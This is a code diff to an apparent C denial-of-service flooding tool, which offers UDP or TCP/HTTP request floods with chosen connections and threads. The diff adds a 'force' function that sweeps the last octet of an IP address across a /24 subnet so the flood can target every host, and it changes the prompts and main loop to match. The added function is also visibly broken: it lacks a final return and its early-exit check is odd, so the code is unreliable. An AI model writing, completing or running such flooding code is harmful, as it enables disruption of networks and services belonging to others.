@@ -99,7 +99,48 @@ void attack(char *host, char *port, int id, int modus)
 		usleep(300000);
 	}
 }
+int force(char *host)
+{
+	char *i;
+	char *p;
+	int stelle;
 
+	p = host;
+	i = strrchr(host, 46);
+  stelle = (i - p) + 1;
+  
+  if(host[stelle] != '\0')
+    return 0;
+	
+	for(int l=0; l <= 2; l++)
+	{
+		if(l != 0)
+			host[stelle] = 48 + l;
+		for(int k=0; k <= 9; k++)
+		{
+			if(k != 0 && l == 0)
+        host[stelle] = 48 + k;
+      if(k != 0 && l != 0)
+        host[stelle + 1] = 48 + k;
+      if(k == 0 && l != 0)
+        host[stelle + 1] = 48 + k;
+      if(l == 2 && k == 6)
+        break;
+      for(int j=48; j <= 57; j++)
+      {
+        if(k == 0 && l == 0)
+          host[stelle] = j;
+        else if(l == 0 && k != 0)
+          host[stelle + 1] = j;
+        else
+          host[stelle + 2] = j;
+        if(l == 2 && k == 5 && j == 53)
+          break;
+        printf("IP: %s\n", host);//start here
+      }
+		}
+	}
+}
 int main(int argc, char **argv) 
 {
 	int x = 0;
@@ -108,15 +149,17 @@ int main(int argc, char **argv)
 	char port[6]; 
 
 	printf("Modus: 0=UDP 1=TCP with HTTP Requests\n");
-	scanf("%d", &modus);
-	printf("Destination IP?\n");
-	scanf("%s", &ip);
+	  scanf("%d", &modus);
+	printf("Destination IP or Brute Force /24?\n");
+    scanf("%s", &ip);
 	printf("Destination Port?\n");
     scanf("%s",&port);
 	printf("Connections?\n");
     scanf("%d",&Connections);
 	printf("Threads?\n");
     scanf("%d",&Threads);
+  
+  if(force(ip))
 
 	while(x != Threads)
 	{	
